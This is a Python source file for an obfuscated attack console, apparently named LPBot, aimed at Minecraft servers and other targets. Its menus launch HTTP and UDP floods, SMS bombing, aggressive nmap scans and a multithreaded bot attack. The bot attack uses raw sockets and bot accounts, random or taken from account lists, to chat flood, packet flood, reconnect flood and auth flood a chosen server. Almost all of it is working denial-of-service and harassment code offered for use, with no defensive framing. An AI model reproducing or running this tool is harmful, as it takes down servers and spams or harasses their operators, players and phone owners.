#coding=utf-8

#No toques nada del codigo si no sabes que haces!

import requests
from SyncPrint import *
from struct import *
from requests import *
from os import system ,name
import datetime
import botlib ,socks ,time ,random ,threading ,string ,ProxyManager ,sys ,binascii ,time ,re ,urllib ,sys
import socket
from bs4 import BeautifulSoup
from collections import namedtuple
from functools import partial
from six .moves import zip_longest
from six import print_
from timeit import default_timer as timer
from prettytable import PrettyTable
import click
import os
os .system ("clear")
fecha =datetime .datetime .now ()



def ayuda():
	print("Help Menu")
	print("=========")
	print("")
	print("    Command               Description                       ")
	print("    -------               -----------                       ")
	print("    Stop                  Kill this session                 ")
	print("    Ping                  TCP ping to IP:PORT               ")
	print("    Scan                  Perform TCP scan                  ")
	print("    Bots                  Bot ATTACK (1.8 - 1.X.X)          ")
	print("    HTTP Flood            HTTP Exploit (L7 FLood)           ")
	print("    UDP Flood             UDP Flood (L4 Flood)              ")
	print("    SMS Bombing           US Only (Via EMAIL)               ")
	print("")
	eleccion =raw_input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
	if (eleccion =="Stop"):
	    synckill('')
	if (eleccion =="Ping"):
	    ping ()
	if (eleccion =="Scan"):
	    nmap ()
	if (eleccion =="Bots"):
	    bots ()
	if (eleccion =="HTTP Flood"):
	    exploit ()
	if (eleccion =='UDP Flood'):
	    UDP()
	if (eleccion =='SMS Bombing'):
		sms()


	
	
def UDP():
    os.system("sudo python UDP.py")
	
def sms ():
    os .system ("sudo python LPSMSBomber.py")

def exploit ():
    os .system ("sudo python3 LPExploit.py")
def nmap ():
    OOOO0O00O0OOO0OOO =raw_input ("[LPTool] Introduce una IP Numerica: ")
    os .system ("nmap -p 40100-40500,20000-20100,26584,25999,29999,25400-25900,100,200,300,400,500,600,700,800,900,1000,1100,1200,1300,1400,1500,1600,1700,1800,1900,2000,2100,2500,2800,5500,6000,6500,7001,7100,7200,5200,5252,9000,9100,16700,16800,16900,17000,17100,17200,16566,1516,69,96,18000-18025,999,5,1,2,3,4,6,7,8,9,10,8000-8025,65534,1515,1678,15915,1696,1506,1514,406,700-705,1500-1550,501-525,60000-60005,500,25599,25500,25600,25500,36000-36010,25555,25670,45000-45025,5000-5005,50000-50005,15000-15015,1000-1025,1-20,26-28,88,1234,123,234,30000-30050,16000-16025,14711,14000-14005,800-900,900-905,32000-32050,35000-35010,20000-20050,25000-25015,45000-45200,10000-10050,6666,777,888,7777,40000-40050 -T5 -Pn -v "+str (OOOO0O00O0OOO0OOO ))
    print ("")
    print ("> - Informacion extra: https://mega.nz/#F!3zQSEIoa!LMfmrisYtLq58RTQe2NwaQ")
def ping ():
    O0O0O0O0O0O00O0OO =raw_input ("[LPing] Introduce una IP: ")
    os .system ("sudo python2 LPing.py "+str (O0O0O0O0O0O00O0OO ))
def bots ():
    print ("")
    print ("Bot Attack")
    print ("==========")
    print ("")
    print("    Command               Description           ")
    print("    -------               -----------           ")
    print("      1                   Version 1.8 - 1.8.9   ")
    print("      2                   Version 1.9           ")
    print("      3                   Version 1.9.1         ")
    print("      4                   Version 1.9.2         ")
    print("      5                   Version 1.9.3 - 1.9.4 ")
    print("      6                   Version 1.10          ")
    print("      7                   Custom Protocol       ")
    print("")
    O0OOO0OO00OO00OO0 =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
    if O0OOO0OO00OO00OO0 ==1 :
        OOOOO0O0OOO00O00O =47
    elif O0OOO0OO00OO00OO0 ==2 :
        OOOOO0O0OOO00O00O =107
    elif O0OOO0OO00OO00OO0 ==3 :
        OOOOO0O0OOO00O00O =108
    elif O0OOO0OO00OO00OO0 ==4 :
        OOOOO0O0OOO00O00O ==109
    elif O0OOO0OO00OO00OO0 ==5 :
        OOOOO0O0OOO00O00O =110
    elif O0OOO0OO00OO00OO0 ==6 :
        OOOOO0O0OOO00O00O =210
    elif O0OOO0OO00OO00OO0 ==7 :
        OOOOO0O0OOO00O00O = input("[LPBot] Introduce el Protocolo: ")
    else :
        synckill ('\n\033[1;31;40m[!] Invalid option!')
    OOO0O00OO0000O00O =['example.com']
    O0OOOO0O0O0000O0O =raw_input ('\033[1;32;40m[-] IP: ')
    r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
    start1 = ("\"ip\":\"")
    end1 = "\","
    a1 = (r1.split(start1))[1].split(end1)[0]
            
    r2 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
    start2 = ("\"port\":")
    end2 = ","
    a2  = (r2.split(start2))[1].split(end2)[0]
    ipresolved = (a1 + ":" + a2)
    print("[LPBot] Listo! " + str(ipresolved))
    O0OOOO0O0O0000O0O = ipresolved
    if (O0OOOO0O0O0000O0O in OOO0O00OO0000O00O ):
        synckill ('\n\033[1;31;40m[!] IP Blacklisted!')
    O00000O0OO00OOO0O =input ('\033[1;32;40m[-] Sesiones: ')
    OO0000O0O00OO0OOO =2
    OO000000OO000OO00 =False
    def OOOOO000O0O000O00 (OOO0O0000O000O0OO ):
        OO00O0OO00O000000 =0
        for O0O000OOO0O0OO0O0 in range (0 ,len (OOO0O0000O000O0OO ),2 ):
            OOO0OO0O000O00OOO =(ord (OOO0O0000O000O0OO [O0O000OOO0O0OO0O0 ])<<8 )+(ord (OOO0O0000O000O0OO [O0O000OOO0O0OO0O0 +1 ]))
            OO00O0OO00O000000 =OO00O0OO00O000000 +OOO0OO0O000O00OOO
        OO00O0OO00O000000 =(OO00O0OO00O000000 >>16 )+(OO00O0OO00O000000 &0xffff );
        OO00O0OO00O000000 =~OO00O0OO00O000000 &0xffff
        return OO00O0OO00O000000
    try :
        OOOOO00OOOOO0O00O =socket .socket (socket .AF_INET ,socket .SOCK_RAW ,socket .IPPROTO_TCP )
    except socket .error as OO00OOOO000O0000O :
        print ('[LPTool] Issue encountered, are you using root? - '+str (OO00OOOO000O0000O [0 ])+' Message '+OO00OOOO000O0000O [1 ])
        sys .exit ()
    OOOOO00OOOOO0O00O .setsockopt (socket .IPPROTO_IP ,socket .IP_HDRINCL ,1 )
    print ("")
    print("Methods")
    print("=========")
    print("")
    print("    Command               Description                              ")
    print("    -------               -----------                              ")
    print("      1                   Drop Items (Creative Needed)              ")
    print("      2                   Chat Flood - Spam a message               ")
    print("      3                   Reconnect Flood - Join and leave spam     ")
    print("      4                   Packet Flood - Send sockets continously   ")
    print("      5                   Timeout Exploit - Jessica A-like          ")
    print("      6                   Basic - Join and stay                     ")
    print("      7                   Auth Flood - Spams login                  ")
    print("")
    OOOO00OOO00O0OOOO =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$  ')
    if OOOO00OOO00O0OOOO ==1 :
        O000O0O0O0000000O =True
        OO0OO0OOOO0O0OO00 =False
        OOOO000O00OOOOO00 =False
        O0OO00OOOOO000OO0 =False
        O0OOOOOOO0O0OOOOO =False
        OOOOO00OO0O0O0OO0 =''
        OOOO0O0OOOO00O000 =''
        O00000OO00O0O0O0O =False
    if OOOO00OOO00O0OOOO ==2 :
        O000O0O0O0000000O =False
        OO0OO0OOOO0O0OO00 =True
        OOOO0O0OOOO00O000 =raw_input ('\033[1;32;40m[!] Mensaje: \033[1;37;40m ')
        OOOOO00OO0O0O0OO0 =''
        OOOO000O00OOOOO00 =False
        O0OO00OOOOO000OO0 =False
        O0OOOOOOO0O0OOOOO =False
        O00000OO00O0O0O0O =False
    if OOOO00OOO00O0OOOO ==3 :
        O000O0O0O0000000O =False
        OO0OO0OOOO0O0OO00 =False
        OOOO000O00OOOOO00 =True
        O0OO00OOOOO000OO0 =False
        O0OOOOOOO0O0OOOOO =False
        OOOOO00OO0O0O0OO0 =''
        OOOO0O0OOOO00O000 =''
        O00000OO00O0O0O0O =False
    if OOOO00OOO00O0OOOO ==4 :
        O000O0O0O0000000O =False
        OO0OO0OOOO0O0OO00 =False
        OOOO000O00OOOOO00 =True
        O0OO00OOOOO000OO0 =True
        O0OOOOOOO0O0OOOOO =False
        OOOOO00OO0O0O0OO0 =''
        OOOO0O0OOOO00O000 =''
        O00000OO00O0O0O0O =True
    if OOOO00OOO00O0OOOO ==5 :
        O000O0O0O0000000O =False
        OO0OO0OOOO0O0OO00 =False
        OOOO000O00OOOOO00 =False
        O0OO00OOOOO000OO0 =False
        O0OOOOOOO0O0OOOOO =True
        OOOOO00OO0O0O0OO0 =''
        OOOO0O0OOOO00O000 =''
        O00000OO00O0O0O0O =False
    if OOOO00OOO00O0OOOO ==6 :
        O000O0O0O0000000O =False
        OO0OO0OOOO0O0OO00 =False
        OOOO000O00OOOOO00 =False
        O0OO00OOOOO000OO0 =False
        O0OOOOOOO0O0OOOOO =False
        OOOOO00OO0O0O0OO0 =''
        OOOO0O0OOOO00O000 =''
        O00000OO00O0O0O0O =False
    if OOOO00OOO00O0OOOO ==7 :
        O000O0O0O0000000O =False
        OO0OO0OOOO0O0OO00 =False
        OOOO000O00OOOOO00 =False
        O0OO00OOOOO000OO0 =False
        O0OOOOOOO0O0OOOOO =False
        OOOOO00OO0O0O0OO0 =''
        OOOO0O0OOOO00O000 =''
        O00000OO00O0O0O0O =True
    print ("")
    print("Nick formatting")
    print("===============")
    print("")
    print("    Command               Description                               ")
    print("    -------               -----------                               ")
    print("      1                   Premium Accounts (From .txt)              ")
    print("      2                   Random (Generated)                        ")
    print("      3                   List (From List.txt)                      ")
    print("      4                   Static (Only One Nickname)                ")
    print("")
    O00000OOO0O0O0OOO =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
    if O00000OOO0O0O0OOO ==1 :
        OOOOO0000OO00000O ='alts'
        OOO0OOOO0000OOO0O =''
    if O00000OOO0O0O0OOO ==2 :
        OOOOO0000OO00000O ='random'
        O00O0OO00O0O00000 =raw_input ('\033[1;31;40m[!] Quieres utilizar un prefijo? (y/n): ')
        if O00O0OO00O0O00000 =='y':
            O000O0OO0OO0OOOOO =raw_input ('\033[1;32;40m[!] Prefijo: ')
        if O00O0OO00O0O00000 =='n':
            O000O0OO0OO0OOOOO =''
        OOO0OOOO0000OOO0O =''
    if O00000OOO0O0O0OOO ==3 :
        OOOOO0000OO00000O ='nicklist'
        OOO0OOOO0000OOO0O =''
    if O00000OOO0O0O0OOO ==4 :
        OOOOO0000OO00000O ='static'
        O0OOO0O00O00O0O0O =raw_input ('\033[1;32;40m[!] Nick: ')
        OOO0OOOO0000OOO0O =''
    if O00000OOO0O0O0OOO ==5 :
        OOOOO0000OO00000O ='no'
        OOO0OOOO0000OOO0O =raw_input ('\033[1;32;40m[!] Nick: ')
    O000O000OO000OO0O =False
    OOO0O0OOOO0O00O00 =[OOO0OOOO0000OOO0O ]
    def OOOOO0O0O0OO0OO00 (O00000O000OOO00OO ,default =25565 ):
        OO0OO00OO0OOO0OOO =O00000O000OOO00OO .replace ('\n','').split (':')
        if len (OO0OO00OO0OOO0OOO )==1 :
            O00O00O0O0OOOO000 =default
        else :
            O00O00O0O0OOOO000 =int (OO0OO00OO0OOO0OOO [1 ])
        return {'ip':OO0OO00OO0OOO0OOO [0 ],'port':O00O00O0O0OOOO000 }
    O0OOOO0O0O0000O0O =OOOOO0O0O0OO0OO00 (O0OOOO0O0O0000O0O )
    O00OO0O0000O0000O =list ()
    OO0OO00OO00OOOO00 =open (O0OOOO0O0O0000O0O ['ip']+'.txt','a+',0 )
    O0OOOO0O0OOOOOO00 =['Test']
    if OOOOO0000OO00000O =='alts':
        O0OOOO0O0OOOOOO00 =open ('alts.txt').readlines ()
    elif OOOOO0000OO00000O =='nicklist':
        O0OOOO0O0OOOOOO00 =open ('nicks.txt').readlines ()
    elif OOOOO0000OO00000O =='bypass':
        OO0OO00OO00OOOO00 =open (O0OOOO0O0O0000O0O ['ip']+'.txt','a+',0 )
        O0OOOO0O0OOOOOO00 =OO0OO00OO00OOOO00 .readlines ()
        syncprint ('\033[1;31;40m[!] Cargando!')
        def O0O000O0000O00OOO (OO000OO00OOOOO000 ,OOOOOO0000O0OO0O0 ):
            if OO000OO00OOOOO000 =='\xc9':
                OO0OOO00OO00OO0OO =OOOOOO0000O0OO0O0 ._readString ().replace ('\xa7f','')
                O00O00OO0OO000O00 =OOOOOO0000O0OO0O0 ._getBytes (1 )
                OO0OO000OOO0O0OOO =OOOOOO0000O0OO0O0 ._getBytes (2 )
                if OO0OOO00OO00OO0OO in OOO0O0OOOO0O00O00 :
                    return True
                if OO0OOO00OO00OO0OO in O0OOOO0O0OOOOOO00 :
                    return True
                OOOOOO0000O0OO0O0 ._log ('Adding '+OO0OOO00OO00OO0OO )
                O0OOOO0O0OOOOOO00 .append (OO0OOO00OO00OO0OO )
                OOOO00OOOO0O000OO .append ((OO0OOO00OO00OO0OO .replace ('\n',''),''))
                OO0OO00OO00OOOO00 .write (OO0OOO00OO00OO0OO +'\n')
                return True
            return False
        def O0O0OO00OO0OO00O0 ():
            while True :
                OOO000000OOOOO000 =time .time ()
                botlib .CraftPlayer (OOO0OOOO0000OOO0O ,password ='',proxy ='',server =(O0OOOO0O0O0000O0O ['ip'],int (O0OOOO0O0O0000O0O ['port'])),eventHook =O0O000O0000O00OOO ,debug =False )._connect ()
                while time .time ()-OOO000000OOOOO000 <=4 :
                    time .sleep (1 )
                print ("\033[1;31;40m[!] -> Reconnecting")
            return
        O000OO0O0OO0OOO0O =threading .Thread (target =O0O0OO00OO0OO00O0 )
        O000OO0O0OO0OOO0O .daemon =True
        O00OO0O0000O0000O .append (O000OO0O0OO0OOO0O )
        O000OO0O0OO0OOO0O .start ()
    elif OOOOO0000OO00000O =='static':
        O0OOOO0O0OOOOOO00 =list ()
        for O0OO0O0O0OOOOOO0O in xrange (1 ,50 ):
            O0OOOO0O0OOOOOO00 .append (O0OOO0O00O00O0O0O )
    O0O0O0OO000000OOO =[]
    if O000O0O0O0000000O ==True :
        O0O0O0OO000000OOO .append ('creativeDrop')
    if OO0OO0OOOO0O0OO00 ==True :
        O0O0O0OO000000OOO .append ('chatFlood')
    if OOOO000O00OOOOO00 ==True :
        O0O0O0OO000000OOO .append ('reconnectFlood')
    if O0OO00OOOOO000OO0 ==True :
        O0O0O0OO000000OOO .append ('pFlood')
    if OO000000OO000OO00 ==True :
        O0O0O0OO000000OOO .append ('sM')
    if O0OOOOOOO0O0OOOOO ==True :
        O0O0O0OO000000OOO .append ('tO')
    if O00000OO00O0O0O0O ==True :
        O0O0O0OO000000OOO .append ('authFlood')
    syncprint ('\033[1;32;40m[!] LPBot Working!')
    syncprint ('')
    syncprint ('\033[1;32;40m[!] LPBot Starting...')
    syncprint ('')
    OOOO00OOOO0O000OO =list ()
    OOOO00O00O0O00OOO =threading .Lock ()
    def O00OOOO0O0OO000O0 (OOOO0OOO0O0000000 ,O0OO00000000O0O00 ):
        try :
            OOOO00OOOO0O000OO .remove ((O0OO00000000O0O00 ._nickname ,O0OO00000000O0O00 ._password ))
        except :
            pass
        print ("callback")
    def O00OOOO000OOO0O0O ():
        with OOOO00O00O0O00OOO :
            pass
        while True :
            try :
                if OOOOO0000OO00000O =='random':
                    O00O0O00O0O00OO00 =(O000O0OO0OO0OOOOO +''.join ((random .choice (string .letters +string .digits )for O0O0OOO000OOO0OOO in range (random .randint (6 -len (O000O0OO0OO0OOOOO ),15 -len (O000O0OO0OO0OOOOO ))))),'')
                else :
                    with OOOO00O00O0O00OOO :
                        O00O0O00O0O00OO00 =OOOO00OOOO0O000OO .pop (0 )
                        OOOO00OOOO0O000OO .append (O00O0O00O0O00OO00 )
                O0OO00O00000OO0OO ,OO0000OOO00OOOOO0 =O00O0O00O0O00OO00
                botlib .CraftPlayer (O0OO00O00000OO0OO ,password =OO0000OOO00OOOOO0 ,protonum =OOOOO0O0OOO00O00O ,proxy ='',server =(O0OOOO0O0O0000O0O ['ip'],int (O0OOOO0O0O0000O0O ['port'])),attacks =O0O0O0OO000000OOO ,prependFlood =OOOOO00OO0O0O0OO0 ,msg =OOOO0O0OOOO00O000 ,debug =False ,printchat =False ,count =OO0000O0O00OO0OOO ,callback =O00OOOO0O0OO000O0 )._connect ()
            except :
                pass
    for O00OO00OOO0OOOO0O in O0OOOO0O0OOOOOO00 :
        O00OOOO0O00O0O000 =''
        if OOOOO0000OO00000O =='alts':
            O00OO00OOO0OOOO0O ,O00OOOO0O00O0O000 =O00OO00OOO0OOOO0O .replace ('\n','').split (':')
        OOOO00OOOO0O000OO .append ((O00OO00OOO0OOOO0O .replace ('\n',''),O00OOOO0O00O0O000 ))
    print ("\033[1;32;40m[!] Loading threads..")
    with OOOO00O00O0O00OOO :
        for O0OO0O0O0OOOOOO0O in xrange (O00000O0OO00OOO0O ):
            O000OO0O0OO0OOO0O =threading .Thread (target =O00OOOO000OOO0O0O )
            O000OO0O0OO0OOO0O .daemon =True
            O00OO0O0000O0000O .append (O000OO0O0OO0OOO0O )
            O000OO0O0OO0OOO0O .start ()
    print ("\033[1;32;40m[!] Running!")
    try :
        while True :
            time .sleep (100000000000 )
    except (KeyboardInterrupt ,SystemExit ):
        synckill ('\n\033[1;31;40m[!] Deteniendo con exito!')


ayuda()

